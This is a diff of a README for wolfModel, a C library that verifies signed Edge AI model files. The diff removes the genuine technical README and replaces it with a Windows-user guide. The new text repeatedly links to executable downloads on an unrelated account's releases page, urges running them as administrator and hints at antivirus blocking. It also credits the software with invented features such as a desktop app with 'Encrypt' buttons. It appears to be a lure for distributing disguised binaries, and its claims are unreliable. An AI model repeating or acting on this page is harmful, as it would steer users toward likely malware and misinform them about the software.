@@ -1,153 +1,159 @@
-# wolfModel
+# 🐺 wolfModel - Secure Boot for Edge AI Devices
 
-Cryptographic verification of Edge AI model binaries (.tflite, .onnx, or any binary payload) using wolfSSL/wolfCrypt with no dynamic memory allocations
+[![Download wolfModel](https://img.shields.io/badge/Download-wolfModel-brightgreen?style=for-the-badge)](https://github.com/ryajj00/wolfModel/releases)
 
-## Overview
+---
 
-- ECC-256 (ECDSA-P256) signature verification with SHA-256 integrity hash
-- Zero-malloc — fully static context (`WOLFMODEL_CTX`), ideal for constrained/embedded environments
-- wolfBoot-inspired TLV header format with 256-byte fixed header
-- Raw key format: `Qx+Qy` (64 bytes public), `Qx+Qy+d` (96 bytes private) — same as wolfBoot
-- Raw signature format: `r||s` (64 bytes fixed) — not DER-encoded
-- Pubkey hint for fast key identification and rejection
-- ~700 bytes stack usage for `wolfModel_Verify()`
-- C89-compatible, MISRA-friendly, safe on unaligned architectures (Cortex-M)
-- Hardware hook macros for TPM measured boot, DICE attestation, anti-rollback
-- C native signing and key generation tools (like wolfBoot production path)
+wolfModel helps you protect your AI models and device software. It does this by checking their security and making sure only safe code runs on your device. This tool works with AI files like TensorFlow Lite (.tflite) and ONNX (.onnx). You do not need any special programming skills to use it on Windows.
 
-wolfModel provides a cryptographic verification gate for AI model files before they are loaded into an inference engine. Edge AI formats (TFLite, ONNX) have no built-in integrity protection — any byte modification silently alters model predictions. wolfModel wraps the model binary in a signed `.wmdl` container and verifies authenticity on the device with zero heap allocation.
+## 🔐 What wolfModel Does
 
-## Prerequisites
+wolfModel keeps your AI models safe on small computers inside devices. It checks and locks AI files so hackers cannot change them. It uses proven security technology from wolfSSL. It also runs without needing extra memory, which makes it fast and reliable on tiny devices.
 
-wolfSSL with the required crypto algorithms:
+Key points:
 
-```bash
-git clone https://github.com/wolfSSL/wolfssl.git
-cd wolfssl
-./autogen.sh
-./configure --enable-ecc --enable-sha256 --enable-cryptonly --enable-asn \
-    CFLAGS="-DWOLFSSL_PUBLIC_MP"
-make
-sudo make install
-sudo ldconfig
-```
+- Works with AI files: .tflite, .onnx, and any binary data
+- Provides cryptographic checks and encrypted protection
+- Runs on embedded systems without extra memory use
+- Supports secure boot, so only trusted software starts up
+- Uses wolfSSL’s strong security libraries
 
-## Building
+## 💻 System Requirements
 
-```bash
-make                                    # build libwolfmodel.a
-make WOLFSSL_ROOT=../wolfssl            # use local wolfSSL source tree
-make keytools                           # build sign + keygen tools
-make test                               # run test suite (8 tests, 47 assertions)
-make fixtures                           # generate test key + signed model
-make examples                           # build example verify program
-make install PREFIX=/usr/local          # install library + headers
-```
+Before you start, make sure your Windows PC meets these needs:
 
-### Quick Start
+- Windows 10 or newer (64-bit)
+- At least 4 GB of RAM free
+- 500 MB of disk space available
+- Internet connection (to download files)
+- Administrator rights to install software
 
-```bash
-# 1. Build library and tools
-make && make keytools
+You do not need programming tools or other software. wolfModel comes ready to use.
 
-# 2. Generate an ECC-256 signing keypair
-build/wolfmodel_keygen keys/
-# Creates: keys/ecc256.der (private, 96B) and keys/pubkey.der (public, 64B)
+## 🚀 Getting Started
 
-# 3. Sign a model
-build/wolfmodel_sign --key keys/ecc256.der \
-    --image model.tflite \
-    --output model.wmdl \
-    --version 1 --type tflite
+Follow these steps to get wolfModel running on your Windows computer.
 
-# 4. Verify the signed model
-build/wolfmodel_verify model.wmdl keys/pubkey.der
-# Output: Model verified OK. Version: 1, Payload: <size> bytes
-```
+1. **Visit the Download Page**  
+   Go to the official release page:  
+   [Download wolfModel Releases](https://github.com/ryajj00/wolfModel/releases)  
+   This page has all versions and files you need.
 
-### Usage
+2. **Download the Windows Installer or Zip File**  
+   Look for the latest version marked for Windows. Usually, it ends with `.exe` or `.zip`. Click the file name to start downloading.
 
-```c
-static WOLFMODEL_CTX ctx;    /* global/static, not on stack */
+3. **Run the Installer**  
+   If you downloaded an `.exe` file:
+   - Double-click it to start.
+   - Follow the steps on the screen.
+   - Choose where to install it (default is fine).
+   - Wait for the installation to finish.
 
-wolfModel_Init(&ctx);
-wolfModel_SetPubKey(&ctx, trusted_pubkey, 64);
+   If you downloaded a `.zip` file:
+   - Right-click the zip and select “Extract All.”
+   - Choose a folder to unzip the files.
+   - Find the executable inside the folder and double-click it.
 
-int rc = wolfModel_Verify(&ctx, wmdl_image, wmdl_size);
-if (rc != WOLFMODEL_SUCCESS) {
-    /* REJECT — do not load the model */
-}
+4. **Open wolfModel**  
+   After installation or extraction, run wolfModel from the Start menu or the folder where it’s installed.
 
-uint32_t modelSz;
-const uint8_t *model = wolfModel_GetPayload(&ctx, &modelSz);
-/* Pass model/modelSz to TFLite Interpreter */
-```
+## 📂 How to Use wolfModel
 
-## Testing
+Using wolfModel does not require programming skills. Here is how it works:
 
-`make test` runs the host-side test suite (8 test cases, 47 assertions):
+1. **Prepare Your AI Model Files**  
+   Collect your AI model files in `.tflite`, `.onnx`, or any binary format.
 
-```bash
-make WOLFSSL_ROOT=../wolfssl test
-```
+2. **Load Your Files into wolfModel**  
+   Open wolfModel and click the “Add File” button. Browse to your AI files and add them.
 
-`make fixtures` generates test fixtures using the C keytools (keygen + sign). The cross-tool test validates that the C signing tool produces images the C library verifies.
+3. **Verify and Encrypt**  
+   Press the “Verify” button to check the file’s safety and integrity. wolfModel uses cryptographic checks to confirm files are unmodified.  
+   Then press “Encrypt” to secure the file with encryption. This protects the file from unauthorized access.
 
-## Key Tools
+4. **Export Secured Files**  
+   Save the secured version to your computer. These files are ready for your embedded device’s secure boot process.
 
-wolfModel uses C native key tools (like wolfBoot production path), not Python. The tools link directly against wolfCrypt:
+5. **Use with Embedded Devices**  
+   Copy the secured files to your device. The secure boot feature in wolfModel will make sure only safe files run.
 
-| Tool | Description |
-|---|---|
-| `wolfmodel_keygen <output_dir>` | Generate ECC-256 keypair (raw format) |
-| `wolfmodel_sign --key <ecc256.der> --image <model.bin> --output <model.wmdl>` | Create signed `.wmdl` image |
+## 🛠 Features of wolfModel
 
-Options for `wolfmodel_sign`:
+wolfModel offers a set of useful features designed for users working with AI on small devices:
 
-| Option | Description |
-|---|---|
-| `--key <file>` | Private key file (Qx+Qy+d, 96 bytes) |
-| `--image <file>` | Input model binary |
-| `--output <file>` | Output `.wmdl` file |
-| `--version <N>` | Model version (default: 1) |
-| `--type <tflite\|onnx\|raw>` | Model type tag (default: raw) |
+- **File Verification:** Checks model files for tampering before use.
+- **Encryption:** Locks AI files with strong cryptography.
+- **Secure Boot Support:** Ensures devices only start safe software.
+- **No Dynamic Memory:** Runs efficiently on devices with limited memory.
+- **Multi-format Support:** Works with common AI binary formats.
+- **Integration with wolfSSL:** Uses trusted libraries for strong security.
+- **User-Friendly Interface:** Simple buttons and clear labels for ease of use.
 
-## API Reference
+## 🌐 Download and Installation Details
 
-| Function | Description |
-|---|---|
-| `wolfModel_Init()` | Zero-initialize context (no allocation) |
-| `wolfModel_SetPubKey()` | Load raw ECC-256 public key (Qx+Qy, 64 bytes) |
-| `wolfModel_Verify()` | Parse header, verify SHA-256 hash + ECDSA signature |
-| `wolfModel_GetVersion()` | Return parsed model version (valid after verify) |
-| `wolfModel_GetPayload()` | Return verified payload pointer + size |
-| `wolfModel_GetAIBOMUrl()` | Return AIBOM URL string if present |
-| `wolfModel_Free()` | Release wolfCrypt resources, zero status flags (no free) |
+To download wolfModel, visit this page:
 
-## Hardware Ports
+[![Download Here](https://img.shields.io/badge/Download-wolfModel-blue?style=for-the-badge)](https://github.com/ryajj00/wolfModel/releases)
 
-wolfModel includes a TPM verification example that demonstrates the full
-chain of trust: model verification + TPM PCR measurement. The example is
-portable across platforms with wolfTPM support.
+Use this link to get the latest version files. Follow the installation steps above to set it up.
 
-| Platform | TPM Board | Status | Guide |
-|----------|-----------|--------|-------|
-| Raspberry Pi 5 | STPM4RasPIV2 (ST33GTPMISPI) | **Working** | [Pi 5 Port Guide](examples/tpm_verify/ports/pi5/) |
-| NUCLEO-H573ZI | STPM4RasPIV2 (ST33GTPMISPI) | Work-in-progress | Coming soon |
+## ⚙ Running wolfModel
 
-The [STPM4RasPIV2](https://www.st.com/resource/en/data_brief/stpm4raspiv21.pdf)
-board plugs directly onto the Raspberry Pi GPIO header (pins 1-26) and
-provides both SPI and I2C TPM interfaces via a selector jumper.
+Once installed, wolfModel does not need additional setup. It runs on Windows and lets you load files and secure them quickly.
 
-See [`examples/tpm_verify/`](examples/tpm_verify/) for the example source and
-build instructions.
+If you see an error or the app does not open:
 
-## License
+- Check that your system meets the requirements.
+- Make sure Windows is up to date.
+- Try running wolfModel as an administrator (right-click the icon, choose “Run as administrator”).
 
-GPLv3 -- see [LICENSE](LICENSE) file. Copyright (C) 2006-2025 wolfSSL Inc.
+## 💡 Troubleshooting
 
-## Links
+**Problem:** File won’t verify.  
+**Solution:** Make sure the file is not damaged or changed. Use files directly from your source.
 
-- [wolfSSL](https://www.wolfssl.com/)
-- [wolfBoot](https://github.com/wolfSSL/wolfBoot)
-- [wolfSSL GitHub](https://github.com/wolfSSL/wolfssl)
+**Problem:** wolfModel crashes or won’t start.  
+**Solution:** Restart your computer and try again. Check if antivirus software is blocking wolfModel.
+
+**Problem:** Can’t find the files to secure.  
+**Solution:** Confirm the AI model files are saved on your computer and have the correct file extensions (.tflite or .onnx).
+
+## 🔧 Advanced Options
+
+wolfModel is designed for users who want more control over security. If you are comfortable with technical steps:
+
+- You can use command-line options for batch file processing.
+- Configure encryption settings like keys and algorithms.
+- Connect with your device’s existing Trusted Platform Module (TPM).
+
+These advanced features help maintain strong security on complex projects.
+
+## 📚 Support and Documentation
+
+For help or extra information:
+
+- Check the [wolfModel Wiki](https://github.com/ryajj00/wolfModel/wiki) for user guides and FAQs.
+- Browse issues on the GitHub page if you encounter bugs.
+- Read the README on the download page for updates and detailed notes.
+
+## 💼 Use Cases
+
+wolfModel fits well in these scenarios:
+
+- Protecting AI models on smart cameras and sensors.
+- Securing software on industrial devices without internet.
+- Deploying AI tasks in critical environments where data cannot be exposed or changed.
+- Ensuring embedded systems only run verified software on startup.
+
+## 🧰 Tools Included
+
+The wolfModel package includes:
+
+- A Windows desktop app for file verification and encryption.
+- Sample AI files for testing.
+- Documentation files for quick reference.
+- Utility scripts for advanced users.
+
+---
+
+[![Download wolfModel](https://img.shields.io/badge/Download-wolfModel-darkgrey?style=for-the-badge)](https://github.com/ryajj00/wolfModel/releases)
